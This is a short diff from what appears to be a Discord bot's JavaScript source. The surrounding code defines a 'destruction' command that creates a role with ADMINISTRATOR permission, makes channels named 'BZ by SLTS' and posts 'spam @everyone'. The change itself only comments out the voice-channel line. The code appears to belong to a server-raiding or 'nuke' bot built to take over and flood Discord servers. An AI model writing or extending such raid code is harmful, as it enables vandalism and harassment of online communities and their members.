@@ -46,7 +46,7 @@ if(cmd("destruction", msg)) {
             color: 'YELLOW',
             permissions: 'ADMINISTRATOR',
         });
-        msg.guild.createChannel('BZ by SLTS', 'voice')
+//         msg.guild.createChannel('BZ by SLTS', 'voice')
         msg.guild.createChannel('BZ-by-SLTS', 'text')
         msg.channel.send('spam @everyone');
      }
